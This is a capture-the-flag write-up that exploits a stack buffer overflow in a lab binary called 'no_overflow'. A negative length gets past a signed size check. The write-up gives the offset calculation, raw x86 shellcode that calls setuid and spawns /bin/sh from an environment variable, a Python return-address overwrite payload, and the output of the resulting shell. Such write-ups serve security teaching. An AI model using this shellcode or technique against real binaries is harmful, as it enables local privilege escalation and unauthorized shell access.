### S0lv3d by H4yicl3

try to download the binary

try to analysis the program
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  size_t v4; // [sp+1Ch] [bp-4h]@1

  be_nice_to_people();
  puts("How long is your name?");
  __isoc99_scanf("%d", &v4);
  if ( (signed int)v4 > 255 )				//check size
    result = puts("Length was too long!");
  else
    result = greet(v4);
  return result;
}
int __cdecl greet(size_t nbytes)
{
  char buf; // [sp+10h] [bp-108h]@1			//need overflow that

  puts("What is your name?");
  read(0, &buf, nbytes);
  return printf("Hello, %s\n!", &buf);
}
```

the v4 variable check the length of buffer!!
if we type negative number !! it will nothing !! so overflow it !! nevermind the check
find the offset
```
-00000108 buf             db ?
+00000004  r              db 4 dup(?)
```
offset = 0x108 + 0x4 =0x10C = 268

we create the shellcode environtment variable
getenv function http://pastebin.com/LZM64WGL to get the address 
```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
./getenv hayicle ./no_overflow
hayicle will be at 0xffffd89a
```

So we need to redirect to the shell variable
```python
padding = "A"*268
retn_shell ="\x9a\xd8\xff\xff"
print padding + retn_shell
```

try run it
```
(echo -1 ;python no_overflow.py ;cat)|./no_overflow 
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
���|���,��������S��
whoami
hayicle
```

well done!!
